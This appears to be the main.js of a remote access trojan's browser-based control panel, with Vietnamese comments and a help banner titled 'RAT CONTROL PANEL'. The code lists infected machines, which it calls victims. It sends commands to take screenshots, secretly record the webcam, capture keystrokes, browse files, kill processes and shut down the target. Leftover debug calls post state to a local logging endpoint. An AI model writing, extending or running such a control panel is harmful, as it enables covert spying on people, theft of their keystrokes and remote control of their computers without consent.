import { CONFIG } from './modules/config.js';
import { Gateway } from './modules/gateway.js';
import { GatewayDiscovery } from './modules/discovery.js';
import * as Logic from './logic.js';

const appState = {
    isConnected: false,
    sessionId: null,
    agents: [],
    currentTarget: 'ALL'
};

const ui = {
    log: (src, msg) => console.log(`%c[${src}] ${msg}`, 'color: #00ff00; font-family: monospace;'),
    error: (src, msg) => console.log(`%c[${src}] ${msg}`, 'color: #ff0000; font-weight: bold;'),
    warn: (src, msg) => console.log(`%c[${src}] ${msg}`, 'color: #ffff00;'),
    info: (msg) => console.log(`%c${msg}`, 'color: cyan; font-weight: bold;'),
    updateAgentList: (agents) => {
        console.group("=== DANH SÁCH AGENT ONLINE ===");
        console.table(agents);
        console.groupEnd();
    },
    renderList: (title, data) => {
        console.group(`=== ${title} ===`);
        console.table(data);
        console.groupEnd();
    },
    renderFileList: (path, files, count) => {
        console.group(`%c=== FILE LIST: ${path} (${count} items) ===`, 'color: #3b82f6; font-weight: bold;');
        if (files && files.length > 0) {
            console.table(files.map(f => ({
                Name: f.name,
                Type: f.type,
                Size: f.size > 0 ? `${(f.size / 1024).toFixed(2)} KB` : '-',
                Modified: f.modified || '-',
                Permissions: f.permissions || '-',
                'Is Dir': f.isDirectory ? '📁' : '📄'
            })));
            
            console.log('%cNavigation:', 'color: #22c55e; font-weight: bold;');
            console.log('  - listFiles("path/to/folder") - List files in folder');
            console.log('  - listFiles("..") - Go to parent directory');
            console.log('  - Click on directory name to navigate');
        } else {
            console.log('%cEmpty directory or access denied', 'color: #ef4444;');
        }
        console.groupEnd();
    }
};

let autoConnectState = {
    hasTriedDiscovery: false,
    isConnecting: false
};

const gateway = new Gateway({
    onConnected: () => {
        ui.log("System", "Đã kết nối tới Gateway! Đang đăng nhập tự động...");
        appState.isConnected = true;
        autoConnectState.isConnecting = false;
        autoConnectState.hasTriedDiscovery = false; // Reset discovery flag on successful connection
        if (gateway.ws && gateway.ws.url) {
            const url = new URL(gateway.ws.url);
            appState.lastConnectedHost = url.hostname;
        }
        console.log(`[Auto] Connection established, stopping any ongoing discovery...`);
        setTimeout(() => {
            gateway.authenticate();
        }, 100);
    },
    onDisconnected: () => {
        // #region agent log
        fetch('http://127.0.0.1:7242/ingest/10c16e71-75ba-4efd-b6cb-47716d67b948',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'main.js:70',message:'onDisconnected callback triggered',data:{lastCloseCode:gateway._lastCloseCode,isConnecting:autoConnectState.isConnecting,hasTriedDiscovery:autoConnectState.hasTriedDiscovery},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'E'})}).catch(()=>{});
        // #endregion
        ui.warn("System", "Mất kết nối Gateway.");
        appState.isConnected = false;
        appState.agents = [];
        autoConnectState.isConnecting = false;
        autoConnectState.hasTriedDiscovery = false;
        
        // Only auto-reconnect if we were actually connected
        // Don't reconnect if connection was intentionally closed (code 1001/1000)
        console.log(`[Auto] Connection lost, will attempt reconnect in 3 seconds...`);
        setTimeout(() => {
            if (!appState.isConnected && !autoConnectState.isConnecting) {
                console.log(`[Auto] Attempting auto-reconnect...`);
                // #region agent log
                fetch('http://127.0.0.1:7242/ingest/10c16e71-75ba-4efd-b6cb-47716d67b948',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'main.js:82',message:'Auto-reconnect triggered from onDisconnected',data:{isConnecting:autoConnectState.isConnecting},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'E'})}).catch(()=>{});
                // #endregion
                autoConnect();
            }
        }, 3000);
    },
    onAuthSuccess: () => {
        ui.log("System", "Đăng nhập thành công! Đang tải danh sách Agent...");
        setTimeout(() => {
            gateway.refreshAgents();
        }, 500);
        
        // If on App_Menu page, trigger refreshAppList after auth
        if (window.location.pathname.includes('App_Menu')) {
            setTimeout(() => {
                if (window.refreshAppList) {
                    window.refreshAppList();
                }
            }, 1000);
        }
        
        // If on Proc_Menu page, trigger refreshProcessList after auth
        if (window.location.pathname.includes('Proc_Menu')) {
            setTimeout(() => {
                if (window.refreshProcessList) {
                    window.refreshProcessList();
                }
            }, 1000);
        }
    },
    onAgentListUpdate: (agentList) => {
        ui.log("System", `Cập nhật danh sách Agent: ${agentList.length} thiết bị.`);
        appState.agents = agentList;
        if (appState.currentTarget !== 'ALL' && !agentList.find(a => a.id === appState.currentTarget)) {
            ui.warn("System", `Target ${appState.currentTarget} đã offline. Reset về 'ALL'.`);
            appState.currentTarget = 'ALL';
            gateway.setTarget('ALL');
        }
        ui.updateAgentList(agentList);
        
        // Trigger render agent list nếu overlay đang mở
        if (window.fetchAndRenderAgents && typeof window.fetchAndRenderAgents === 'function') {
            // Reset về page 1 khi có update mới
            if (window.resetAgentListPage && typeof window.resetAgentListPage === 'function') {
                window.resetAgentListPage();
            }
            window.fetchAndRenderAgents();
        }
    },
    onScreenshot: (base64Data, agentId) => {
        ui.log("Spy", `Nhận ảnh màn hình từ ${agentId}`);
        
        // Check if we're on screen_webcam page and display preview
        if (window.displayImagePreview && window.location.pathname.includes('screen_webcam')) {
            if (base64Data && base64Data.trim() !== '') {
                window.displayImagePreview(base64Data);
            } else {
                if (window.handleCaptureError) {
                    window.handleCaptureError('Không nhận được dữ liệu ảnh từ server');
                }
            }
        } else {
            // Also show in modal if available (for other pages)
            const modal = document.getElementById('image-modal');
            const img = document.getElementById('modal-img');
            
            if (img && modal) {
                img.src = "data:image/jpeg;base64," + base64Data;
                modal.classList.remove('hidden');
                modal.style.display = 'block';
            } else if (!window.displayImagePreview) {
                console.log("%c[ẢNH]", "font-size: 50px; background-image: url(data:image/jpeg;base64," + base64Data + ")");
            }
        }
    },
    onCamera: (videoData, agentId) => {
        ui.log("Spy", `Nhận video từ ${agentId}`);
        
        // Check if we're on screen_webcam page and display preview
        if (window.displayVideoPreview && window.location.pathname.includes('screen_webcam')) {
            if (videoData && videoData.trim() !== '') {
                window.displayVideoPreview(videoData);
            } else {
                if (window.handleCaptureError) {
                    window.handleCaptureError('Không nhận được dữ liệu video từ server');
                }
            }
        } else {
            // Fallback to download if not on preview page
            if (videoData && videoData.trim() !== '') {
                const link = document.createElement('a');
                link.href = "data:video/mp4;base64," + videoData;
                link.download = `cam_${agentId}_${Date.now()}.mp4`;
                link.click();
            }
        }
    },
    onKeylog: (keyData, agentId) => {
        const keylogPanel = document.getElementById('keylog-panel');
        if (keylogPanel) {
            keylogPanel.value += keyData;
            keylogPanel.scrollTop = keylogPanel.scrollHeight;
        }
        console.log(`%c[Keylog - ${agentId}]: ${keyData.replace(/\n/g, '\\n')}`, 'color: orange');
    },
    onMessage: (msg) => {
        console.log("Raw Msg: ", msg);
    },
    onError: (err) => {
        ui.error("Main", err);
    }
});

window.ui = ui;
window.gateway = gateway;
window.CONFIG = CONFIG;
window.appState = appState;
window.CONFIG = CONFIG; 

window.help = () => {
    console.clear();
    console.log("%c=== RAT CONTROL PANEL - HƯỚNG DẪN ===", "color: #fff; background: #8b5cf6; font-size: 16px; padding: 10px; border-radius: 5px; width: 100%; display: block;");
    
    console.group("%c1. KẾT NỐI & QUẢN LÝ", "color: #3b82f6");
    console.log("getAgentList()    - fetch agent list")
    console.log("auth()            - Đăng nhập (Bắt buộc sau khi connect)");
    console.log("discover()        - Tự động tìm Gateway (default gateways → mDNS)");
    console.log("setTarget('ID')   - Chọn mục tiêu cụ thể (hoặc 'ALL')");
    console.log("whoami()          - Lấy tên máy của mục tiêu");
    console.groupEnd();

    console.group("%c2. GIÁN ĐIỆP & THEO DÕI", "color: #ef4444");
    console.log("screenshot()      - Chụp ảnh màn hình");
    console.log("recordCam(s)      - Quay lén webcam (s: số giây, mặc định 5)");
    console.log("startKeylog()     - Bắt đầu nhận keylog");
    console.log("stopKeylog()      - Dừng keylog");
    console.groupEnd();

    console.group("%c3. ỨNG DỤNG & TIẾN TRÌNH", "color: #22c55e");
    console.log("listApps()        - Xem danh sách ứng dụng đã cài");
    console.log("startApp(id)      - Mở ứng dụng theo ID (lấy từ listApps)");
    console.log("stopApp(id)       - Tắt ứng dụng theo ID");
    console.log("listProcs()       - Xem danh sách tiến trình đang chạy");
    console.log("startProc(id)     - (Ít dùng) Chạy process");
    console.log("stopProc(id)      - Kill process theo PID");
    console.groupEnd();

    console.group("%c4. FILE SYSTEM", "color: #f59e0b");
    console.log("listFiles(path)   - List files trong thư mục (VD: listFiles('C:\\\\') hoặc listFiles('/home'))");
    console.log("listFiles()       - List files thư mục hiện tại (mặc định)");
    console.groupEnd();

    console.group("%c5. KHÁC", "color: #eab308");
    console.log("echo('msg')       - Gửi tin nhắn test (hiện popup/log bên agent)");
    console.log("shutdownAgent()   - Tắt máy nạn nhân");
    console.log("restartAgent()   - Tắt máy nạn nhân");
    console.log("help()            - Xem lại bảng này");
    console.log("demoFileList()    - Demo file list commands");
    console.groupEnd();
    
    return "Hãy bắt đầu bằng lệnh: connect('localhost')";
};

async function autoConnect() {
    // #region agent log
    fetch('http://127.0.0.1:7242/ingest/10c16e71-75ba-4efd-b6cb-47716d67b948',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'main.js:219',message:'autoConnect() called',data:{isConnecting:autoConnectState.isConnecting,hasTriedDiscovery:autoConnectState.hasTriedDiscovery,existingWs:!!gateway.ws,wsReadyState:gateway.ws?.readyState},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'E'})}).catch(()=>{});
    // #endregion
    if (autoConnectState.isConnecting || appState.isConnected) {
        return;
    }
    
    autoConnectState.isConnecting = true;
    ui.info("[Auto] Đang tự động tìm Gateway...");
    
    try {
        let found = false;
        
        const discoveryPromise = discovery.discover((ip, port) => {
            found = true;
            console.log(`[Auto] Discovery callback: ip=${ip}, port=${port}`);
            ui.log("Auto", `Tìm thấy Gateway: ${ip}:${port}`);
            gateway.connect(ip, port);
        }, (progress) => {
            if (progress) {
                ui.info(`[Auto] ${progress}`);
            }
        });
        
        const timeoutPromise = new Promise(resolve => setTimeout(() => resolve(false), 15000));
        const result = await Promise.race([discoveryPromise, timeoutPromise]);
        
        if (found || result) {
            return;
        }
        
        ui.warn("Auto", "Không tìm thấy Gateway. Đảm bảo Gateway đang chạy và Bonjour/mDNS đã được cài đặt.");
        autoConnectState.hasTriedDiscovery = true;
        autoConnectState.isConnecting = false;
    } catch (error) {
        ui.error("Auto", `Discovery error: ${error}`);
        autoConnectState.hasTriedDiscovery = true;
        autoConnectState.isConnecting = false;
    }
}

document.addEventListener('DOMContentLoaded', () => {
    window.help();
    autoConnect();
});

window.getAgentList = () => {
    Logic.getAgentList();
}

window.auth = () => {
    if(!gateway.ws || gateway.ws.readyState !== WebSocket.OPEN) {
        ui.error("CMD", "Chưa kết nối! Hãy gọi connect('IP') trước.");
        return;
    }
    Logic.authenticate();
};

const discovery = new GatewayDiscovery();

// Note: LAN Scanner removed per plan requirements
// Use discover() or default gateways instead

window.discover = () => {
    ui.info("[Discovery] Đang tìm Gateway...");
    discovery.discover((ip, port) => {
        ui.log("Discovery", `Tìm thấy Gateway tại: ${ip}:${port}`);
        gateway.connect(ip, port);
        setTimeout(() => gateway.authenticate(), 500);
    }, (progress) => {
        if (progress) {
            ui.info(`[Discovery] ${progress}`);
        }
    });
};

window.reconnect = () => {
    ui.info("[Main] Đang kết nối lại...");
    autoConnect();
};

window.setTarget = (agentId) => {
    appState.currentTarget = agentId;
    Logic.setTarget(agentId);
    ui.info(`[Control] Đã khóa mục tiêu: ${agentId}`);
}

window.listApps = () => Logic.fetchAppList();
window.startApp = (id) => Logic.startApp(id);
window.stopApp = (id) => Logic.stopApp(id);

window.listProcs = () => Logic.fetchProcessList();
window.startProc = (id) => Logic.startProcess(id);
window.stopProc = (id) => Logic.killProcess(id);

window.listFiles = (path = "") => {
    if (path === "") {
        path = "/";
    }
    ui.info(`[CMD] Listing files in: ${path}`);
    Logic.listFiles(path);
};

window.whoami = () => Logic.whoami();
window.echo = (text) => Logic.echo(text);
window.screenshot = () => {
    ui.info("[CMD] Chụp màn hình...");
    Logic.captureScreen();
};
window.recordCam = (duration = 5) => {
    ui.info(`[CMD] Quay webcam ${duration} giây...`);
    Logic.recordWebcam(duration);
};

window.startKeylog = () => {
    ui.info("[CMD] Bật Keylogger...");
    Logic.startKeylog(0.5);
};
window.stopKeylog = () => {
    ui.info("[CMD] Tắt Keylogger...");
    Logic.stopKeylog();
};

window.shutdownAgent = () => {
    if(confirm("CẢNH BÁO: Bạn chắc chắn muốn tắt máy mục tiêu?")) {
        Logic.shutdownAgent();
    }
}

window.restartAgent = () => {
    if (confirm("RESTART?")) {
        Logic.restartAgent();
    }
}

window.demoFileList = () => {
    console.clear();
    console.log("%c=== DEMO FILE LIST ===", "color: #fff; background: #8b5cf6; font-size: 16px; padding: 10px;");
    console.log("%cTesting file list functionality...", "color: cyan;");
    console.log("");
    
    console.log("%c1. List root directory:", "color: #3b82f6; font-weight: bold;");
    console.log("   listFiles('/')");
    console.log("");
    
    console.log("%c2. List Windows C: drive:", "color: #3b82f6; font-weight: bold;");
    console.log("   listFiles('C:\\\\')");
    console.log("");
    
    console.log("%c3. List home directory:", "color: #3b82f6; font-weight: bold;");
    console.log("   listFiles('~') or listFiles(process.env.HOME)");
    console.log("");
    
    console.log("%c4. Navigate to subfolder:", "color: #3b82f6; font-weight: bold;");
    console.log("   listFiles('/home/username')");
    console.log("   listFiles('C:\\\\Users\\\\Username')");
    console.log("");
    
    console.log("%cNow try:", "color: #22c55e; font-weight: bold;");
    console.log("   listFiles('/')");
    console.log("");
    
    return "Demo ready! Try: listFiles('/')";
}
